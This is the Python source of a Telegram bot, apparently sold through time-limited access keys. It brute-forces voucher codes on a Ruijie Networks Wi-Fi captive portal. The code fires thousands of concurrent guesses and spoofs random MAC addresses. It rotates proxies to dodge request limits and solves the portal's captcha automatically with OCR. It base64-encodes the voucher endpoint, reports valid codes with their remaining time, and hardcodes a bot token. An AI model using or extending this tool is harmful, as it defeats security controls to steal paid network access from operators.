import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

BOT_TOKEN = ''8889706834:AAHppLiH8XMOcxsTTE6EVXY932q4XKCi5mQ"
ADMIN_ID = "6537847588"
SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
retry_counts = {}
session = None
_connector = None

# ==================== PERFORMANCE SETTINGS ====================
CONCURRENCY = 2000
BATCH_SIZE = 2000
CONNECTION_LIMIT = 5000
KEEPALIVE_TIMEOUT = 60
PROGRESS_UPDATE_INTERVAL = 5

_voucher_sem = None
_start_time = time.monotonic()

# ==================== PROXY CONFIG ====================
# Format:
#   http://user:pass@ip:port
#   http://ip:port
#   socks5://user:pass@ip:port
PROXY_LIST = [
    # "http://user:pass@1.2.3.4:8080",
    # "http://user:pass@5.6.7.8:8080",
    # "socks5://user:pass@9.10.11.12:1080",
]

PROXY_ENABLED = len(PROXY_LIST) > 0
_proxy_index = 0
_proxy_lock = asyncio.Lock()
_proxy_fail_count = {}
PROXY_MAX_FAILS = 5

def load_proxies_from_file(path="proxies.txt"):
    global PROXY_LIST, PROXY_ENABLED
    if not os.path.exists(path):
        return
    try:
        with open(path, "r", encoding="utf-8") as f:
            proxies = [
                line.strip() for line in f
                if line.strip() and not line.startswith("#")
            ]
        if proxies:
            PROXY_LIST = proxies
            PROXY_ENABLED = True
            print(f"[proxy] Loaded {len(PROXY_LIST)} proxies from {path}")
    except Exception as e:
        print(f"[proxy] Load error: {e}")

async def get_next_proxy():
    global _proxy_index
    if not PROXY_ENABLED:
        return None
    async with _proxy_lock:
        tried = 0
        while tried < len(PROXY_LIST):
            proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
            _proxy_index += 1
            tried += 1
            if _proxy_fail_count.get(proxy, 0) < PROXY_MAX_FAILS:
                return proxy
        _proxy_fail_count.clear()
        return PROXY_LIST[_proxy_index % len(PROXY_LIST)]

def mark_proxy_fail(proxy):
    if proxy:
        _proxy_fail_count[proxy] = _proxy_fail_count.get(proxy, 0) + 1

def mark_proxy_success(proxy):
    if proxy and proxy in _proxy_fail_count:
        _proxy_fail_count[proxy] = 0

# ==================== LOCAL JSON ====================
AUTH_FILE = "auth_list.json"
RESULT_FILE = "result.json"

def _load_local(path):
    if not os.path.exists(path):
        return {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        print(f"Load error {path}: {e}")
        return {}

def _save_local(path, data):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Save error {path}: {e}")

# ==================== WEB SERVER ====================
async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    print(f"Web server started on port {port}")

# ==================== BOT COMMANDS ====================
@bot.message_handler(commands=['start'])
async def start(message):
    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /key ဖြင့်စတင်ပါ။")

@bot.message_handler(commands=['key'])
async def handle_key(message):
    global approve
    key = str(message.chat.id)
    auth_list = _load_local(AUTH_FILE)
    if key in auth_list:
        valid = check_key_expiration(auth_list[key])
        if valid:
            approve[message.chat.id] = True
            user_data[message.chat.id] = {}
            await bot.reply_to(
                message,
                " Key မှန်ကန်ပါသည်။ /input ဖြင့် Session URL ထည့်ပါ။"
            )
        else:
            approve[message.chat.id] = False
            await bot.reply_to(message, " Key Expired ဖြစ်နေပါသည်။")
    else:
        await bot.reply_to(message, " သင်၏ key ကို registered မလုပ်ရသေးပါ။")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list = _load_local(AUTH_FILE)
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        auth_list = _load_local(AUTH_FILE)
        if user_id not in auth_list:
            await bot.reply_to(message, f"User ID {user_id} မတွေ့ပါ။")
            return
        del auth_list[user_id]
        _save_local(AUTH_FILE, auth_list)
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(message, f" Key Deleted\n\nUSER ID : {user_id}")
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/genkey 1h 123456789")
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(message, "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited")
            return
        auth_list = _load_local(AUTH_FILE)
        auth_list[user_id] = {
            "expires_at": expiry,
            "plan": plan
        }
        _save_local(AUTH_FILE, auth_list)
        await bot.reply_to(
            message,
            f" Key Generated\n\nUSER ID : {user_id}\nPLAN : {plan}\nEXPIRES : {expiry}"
        )
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    auth_list = _load_local(AUTH_FILE)
    if str(message.chat.id) in auth_list:
        results = _load_local(RESULT_FILE)
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            codes = "\n".join(results[chat_id_str])
            await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
        else:
            await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသေး code မရှိသေးပါ။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို registered မပြုလုပ်ရသေးပါ။")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(int, expiration_time.split('-'))
        expiration_dt = datetime(
            year=yyyy, month=MM, day=dd,
            hour=hh, minute=mm, second=0,
            tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_current_time():
    return datetime.now(timezone.utc)

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    auth_list = _load_local(AUTH_FILE)
    if str(message.chat.id) in auth_list:
        results = _load_local(RESULT_FILE)
        chat_id_str = str(message.chat.id)
        if chat_id_str in results and results[chat_id_str]:
            if message.chat.id not in user_data:
                await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
                return
            if "session_url" not in user_data[message.chat.id]:
                await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
                return
            codes = results[chat_id_str]
            await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
            session_url_recheck = user_data[message.chat.id]["session_url"]
            recheck_list = []
            for code in codes:
                recode = await perform_check(
                    session_url_recheck, code, chat_id,
                    scan_id=None, recheck=True, message=message
                )
                if recode:
                    recheck_list.append(recode)
            to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
            await bot.reply_to(message, f"✅ Rechcked Codes:\n\n{to_show}")
            results[chat_id_str] = recheck_list
            _save_local(RESULT_FILE, results)
        else:
            await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")
    else:
        await bot.reply_to(message, "သင်၏ key ကို registered မလုပ်ရသေးပါ။")

async def check_session_url(session_url):
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    proxy = await get_next_proxy()
    try:
        async with session.get(
            session_url, allow_redirects=True, headers=headers,
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)
        ) as response:
            text_ = str(response.url)
            if "sessionId" in text_:
                return True
            return False
    except:
        mark_proxy_fail(proxy)
        return False

@bot.message_handler(commands=['input'])
async def handle_input(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/input your_session_url")
        return
    url = args[1]
    if message.chat.id in user_data:
        await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
        if await check_session_url(session_url=url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(message, "Session URL အားသိမ်းဆည်းပြီးပါပြီ။ /scan 6, 7, 8, all, ascii-lower စသည်ဖြင့်မိမိအသုံးပြုလိုတာကိုရွေးပြီး စတင်ပါ။")
        else:
            await bot.reply_to(message, f"Session URL မှားယွင်းနေပါသည်။")

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>")
        return
    mode = args[1]
    chat_id = message.chat.id
    if not approve.get(chat_id, False):
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    if chat_id not in user_data:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /key ကိုအရင်ပြုလုပ်ပေးပါ။")
        return
    if 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/scan ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
        return

    if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
        await bot.reply_to(message, "/scan သည် အလုပ်လုပ်နေပြီဖြစ်သည် /scan ကိုထပ်မံမလုပ်ပါနှင့်။")
        return

    progress_msg = await bot.send_message(chat_id, "🔍Scanning Codes...\n\n")
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, chat_id, user_data[chat_id]['session_url'],
            scan_id, message=message, progress_msg=progress_msg
        )
    )
    scan_tasks[chat_id] = {
        "task": task,
        "stop": False,
        "scan_id": scan_id
    }

@bot.message_handler(commands=['status'])
async def status(message):
    if str(message.chat.id) != ADMIN_ID:
        await bot.reply_to(message, "No Permission")
        return
    active_scans = sum(1 for data in scan_tasks.values() if not data["task"].done())
    approved_users = sum(1 for v in approve.values() if v)
    uptime_seconds = int(time.monotonic() - _start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    healthy = sum(1 for p in PROXY_LIST if _proxy_fail_count.get(p, 0) < PROXY_MAX_FAILS)
    await bot.reply_to(
        message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
        f"🔍 Active Scans: {active_scans}\n"
        f"✅ Approved Users: {approved_users}\n"
        f"👥 Sessions Loaded: {len(user_data)}\n"
        f"🌐 Proxies: {len(PROXY_LIST)} (Healthy: {healthy})\n"
        f"⚡ Concurrency: {CONCURRENCY}"
    )

@bot.message_handler(commands=['stop'])
async def stop_scan(message):
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["scan_id"] = None
        data["task"].cancel()
        for d in (success_messages, success_texts, limited_messages, limited_texts, retry_counts):
            d.pop(chat_id, None)
        await bot.reply_to(message, "/scan ကို ရပ်တန့်ပြီးပါပြီ။")
    else:
        await bot.reply_to(message, "/stop ဖြင့်ရပ်တန့်ရန် မည်သည့်အလုပ်မျှမရှိပါ။")

# ==================== RESULT SAVER ====================
async def result_saver():
    global SUCCESS_CODE
    while True:
        await asyncio.sleep(30)
        items = []
        while not SUCCESS_CODE.empty():
            items.append(await SUCCESS_CODE.get())
        if items:
            try:
                results = _load_local(RESULT_FILE)
                for item in items:
                    chat_id = str(item["chat_id"])
                    code = item["code"]
                    if chat_id not in results:
                        results[chat_id] = []
                    if code not in results[chat_id]:
                        results[chat_id].append(code)
                _save_local(RESULT_FILE, results)
            except Exception as e:
                print(f"Update Error: {e}")

# ==================== GENERATORS ====================
def digit_generator(length):
    return "".join(random.choice(string.digits) for _ in range(length))

strings = string.ascii_lowercase + string.digits
def all_generator(length=6):
    return "".join(random.choice(strings) for _ in range(length))

strings_2 = string.ascii_lowercase
def ascii_generator(length=6):
    return "".join(random.choice(strings_2) for _ in range(length))

def iter_codes(mode):
    if mode in ["6", "7"]:
        length = int(mode)
        codes = [str(i).zfill(length) for i in range(10 ** length)]
        random.shuffle(codes)
        yield from codes
        return
    if mode == "8":
        while True:
            yield digit_generator(8)
    if mode == "ascii-lower":
        while True:
            yield ascii_generator(6)
    if mode == "all":
        while True:
            yield all_generator(6)
    raise ValueError(f"Unsupported scan mode: {mode}")

def format_progress(checked, total=None, speed=0, found=0, retries=0):
    speed_str = f"{speed:,.0f} codes/min"
    if total is not None:
        bar_length = 20
        percent = (checked / total) * 100
        filled = min(bar_length, int(percent / 5))
        bar = "█" * filled + "░" * (bar_length - filled)
        return (
            f"🔍Scanning Codes...\n\n"
            f"📦Checked : {checked:,}/{total:,}\n"
            f"📊Progress : {percent:.2f}%\n"
            f"⚡Speed : {speed_str}\n"
            f"✅Found : {found}\n"
            f"🔁Retry : {retries}\n"
            f"[{bar}]"
        )
    return (
        f"🔍Scanning Codes...\n\n"
        f"📦Checked : {checked:,}\n"
        f"⚡Speed : {speed_str}\n"
        f"✅Found : {found}\n"
        f"🔁Retry : {retries}\n"
        f"📊Status : running\n"
    )

def _captcha_entry(chat_id):
    if chat_id not in captcha_state:
        captcha_state[chat_id] = {
            "session_id": None,
            "auth_code": None,
            "lock": asyncio.Lock(),
        }
    return captcha_state[chat_id]

def invalidate_captcha(chat_id):
    entry = _captcha_entry(chat_id)
    entry["session_id"] = None
    entry["auth_code"] = None

# ==================== BRUTEFORCE ====================
async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, progress_msg=None):
    try:
        code_iter = iter_codes(mode)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return
    total = 10 ** int(mode) if mode in ["6", "7"] else None
    checked = 0
    last_key_check = time.monotonic()
    scan_start = time.monotonic()
    last_progress_update = 0
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    try:
        while True:
            current_task = scan_tasks.get(chat_id)
            if not current_task or current_task.get("scan_id") != scan_id:
                return
            if current_task.get("stop"):
                scan_tasks.pop(chat_id, None)
                for d in (success_messages, success_texts, limited_messages, limited_texts, retry_counts):
                    d.pop(chat_id, None)
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            if time.monotonic() - last_key_check >= 600:
                auth_list = _load_local(AUTH_FILE)
                if (str(chat_id) not in auth_list or
                        not check_key_expiration(auth_list[str(chat_id)])):
                    approve[chat_id] = False
                    await bot.send_message(chat_id, "သင်၏ key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။")
                    scan_tasks.pop(chat_id, None)
                    for d in (success_messages, success_texts, limited_messages, limited_texts, retry_counts):
                        d.pop(chat_id, None)
                    return
                last_key_check = time.monotonic()

            async def _check(code):
                async with _voucher_sem:
                    return await perform_check(session_url, code, chat_id, scan_id, message=message)

            await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)

            checked += len(batch)
            elapsed = time.monotonic() - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0
            found = len(success_texts.get(chat_id, []))
            retries = retry_counts.get(chat_id, 0)

            if time.monotonic() - last_progress_update >= PROGRESS_UPDATE_INTERVAL:
                text = format_progress(checked, total, speed, found, retries)
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=progress_msg.message_id,
                        text=text
                    )
                    last_progress_update = time.monotonic()
                except Exception:
                    try:
                        new_msg = await bot.send_message(chat_id, text)
                        progress_msg.message_id = new_msg.message_id
                        last_progress_update = time.monotonic()
                    except Exception as err:
                        print(f"Progress Message Error: {err}")

        if progress_msg:
            final_found = len(success_texts.get(chat_id, []))
            final_retries = retry_counts.get(chat_id, 0)
            finish_text = (
                "🔍Scanning Completed\n\n"
                f"📦Checked : {checked:,}\n"
                f"✅Found : {final_found}\n"
                f"🔁Retry : {final_retries}\n"
                "📊Progress : 100%\n"
                "[████████████████████]"
            )
            try:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_msg.message_id,
                    text=finish_text
                )
            except:
                try:
                    await bot.send_message(chat_id, finish_text)
                except Exception as err:
                    print(f"Progress Finish Message Error: {err}")
        scan_tasks.pop(chat_id, None)
        for d in (success_messages, success_texts, limited_messages, limited_texts, retry_counts):
            d.pop(chat_id, None)
    finally:
        scan_tasks.pop(chat_id, None)
        for d in (success_messages, success_texts, limited_messages, limited_texts, retry_counts):
            d.pop(chat_id, None)

# ==================== MAC & SESSION ====================
def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id=None, proxy=None):
    mac = get_mac()
    session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'referer': session_url,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
    }
    try:
        async with session.get(
            session_url, headers=headers, allow_redirects=True,
            proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)
        ) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            return previous_session_id
    except:
        print("Session ID Fetch Error")
        return previous_session_id

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)
    return url

# ==================== EXPIRY ====================
async def Code_Expires_Date(session_id):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json;',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    proxy = await get_next_proxy()
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(
            connector=_connector,
            connector_owner=False,
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as fresh_session:
            async with fresh_session.get(
                f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
                headers=headers, proxy=proxy
            ) as req:
                respond = await req.json()
                result = respond.get('result', {})
                profile_name = result.get('profileName', 'Unknown')
                total_minutes_raw = result.get('totalMinutes', 'Unknown')

                if total_minutes_raw == 'Unknown' or total_minutes_raw is None:
                    return "📋 Plan: Unknown | ⏳ Time: Unknown | 🕐 Expires: Unknown"
                try:
                    total_minutes = int(total_minutes_raw)
                except (ValueError, TypeError):
                    return f"📋 Plan: {profile_name} | ⏳ Time: Unknown | 🕐 Expires: Unknown"

                now = datetime.now(timezone.utc)
                expire_dt = now + timedelta(minutes=total_minutes)
                expire_str = expire_dt.strftime("%Y-%m-%d %H:%M:%S UTC")

                hours = total_minutes // 60
                minutes = total_minutes % 60
                if hours > 0 and minutes > 0:
                    time_str = f"{hours}h {minutes}m"
                elif hours > 0:
                    time_str = f"{hours}h"
                else:
                    time_str = f"{minutes}m"

                return f"📋 Plan: {profile_name} | ⏳ Time: {time_str} | 🕐 Expires: {expire_str}"
    except Exception as e:
        print(f"[Code_Expires_Date] error: {e}")
        mark_proxy_fail(proxy)
        return "📋 Plan: Unknown | ⏳ Time: Unknown | 🕐 Expires: Unknown"

# ==================== OCR ====================
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes):
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    result = _ocr.classification(buffer.tobytes())
    return result.upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id, proxy=None):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params=params, headers=headers, proxy=proxy,
        timeout=aiohttp.ClientTimeout(total=8)
    ) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text, proxy=None):
    headers = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/json',
        'origin': 'https://portal-as.ruijienetworks.com',
        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=headers, json=json_data, proxy=proxy,
        timeout=aiohttp.ClientTimeout(total=8)
    ) as req:
        data = await req.json()
        if data.get("success") == True:
            return session_id
        return None

# ==================== PERFORM CHECK ====================
async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
    global _connector
    if not recheck:
        current_task = scan_tasks.get(chat_id)
        if not current_task or current_task.get("scan_id") != scan_id:
            return

    post_url = base64.b64decode(
        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
    ).decode()

    response = None
    session_id = None

    for _attempt in range(3):
        proxy = await get_next_proxy()
        timeout = aiohttp.ClientTimeout(total=12)

        try:
            async with aiohttp.ClientSession(
                connector=_connector,
                connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=timeout
            ) as task_session:

                session_id = await get_session_id(task_session, session_url, None, proxy=proxy)
                if not session_id:
                    mark_proxy_fail(proxy)
                    continue

                auth_code = None
                for _ in range(6):
                    try:
                        image = await Captcha_Image(task_session, session_id, proxy=proxy)
                        text = await Captcha_Text(image)
                        if not text:
                            continue
                        verified = await Varify_Captcha(task_session, session_id, text, proxy=proxy)
                        if verified:
                            auth_code = text
                            break
                    except Exception as e:
                        print(f"[captcha] {e}")
                        mark_proxy_fail(proxy)
                        break

                if not auth_code:
                    continue

                if not recheck:
                    current_task = scan_tasks.get(chat_id)
                    if (not current_task or current_task.get("scan_id") != scan_id
                            or current_task.get("stop")):
                        return

                data = {
                    "accessCode": code,
                    "sessionId": session_id,
                    "apiVersion": 1,
                    "authCode": auth_code,
                }
                headers = {
                    "authority": "portal-as.ruijienetworks.com",
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/json",
                    "origin": "https://portal-as.ruijienetworks.com",
                    "referer": (
                        f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html"
                        f"?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}"
                    ),
                    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": '"Android"',
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                }
                async with task_session.post(
                    post_url, json=data, headers=headers, proxy=proxy
                ) as req:
                    response = await req.text()
                    resp_json = json.loads(response)
                    mark_proxy_success(proxy)

        except Exception as e:
            print(f"[perform_check] error: {e}")
            mark_proxy_fail(proxy)
            continue

        if response and 'request limited' in response:
            retry_counts[chat_id] = retry_counts.get(chat_id, 0) + 1
            mark_proxy_fail(proxy)
            continue
        break

    if not response:
        return

    if 'logonUrl' in response:
        if recheck:
            return code

        if chat_id not in success_texts:
            success_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        success_texts[chat_id].append(f"🎫 {code}\n   {expire_date}")
        code_line = "\n\n".join(success_texts[chat_id])
        await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
        if message:
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"Success Codes:\n\n{code_line}"
                    )
                    success_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=success_messages[chat_id],
                            text=f"Success Codes:\n\n{code_line}"
                        )
                    except:
                        sent = await bot.send_message(
                            chat_id=message.chat.id,
                            text=f"Success Codes:\n\n{code_line}"
                        )
                        success_messages[chat_id] = sent.message_id
            except Exception as e:
                print(f"Success Message Error: {e}")
    elif 'STA' in response:
        if chat_id not in limited_texts:
            limited_texts[chat_id] = []
        expire_date = await Code_Expires_Date(session_id)
        limited_texts[chat_id].append(f"⚠️ {code}\n   {expire_date}")
        limited_line = "\n\n".join(limited_texts[chat_id])
        if message:
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(
                        chat_id=message.chat.id,
                        text=f"Limited Codes:\n\n{limited_line}"
                    )
                    limited_messages[chat_id] = sent.message_id
                else:
                    try:
                        await bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=limited_messages[chat_id],
                            text=f"Limited Codes:\n\n{limited_line}"
                        )
                    except:
                        sent = await bot.send_message(
                            chat_id=message.chat.id,
                            text=f"Limited Codes:\n\n{limited_line}"
                        )
                        limited_messages[chat_id] = sent.message_id
            except Exception as e:
                print(f"Limited Message Error: {e}")

# ==================== POLLING ====================
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=35)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
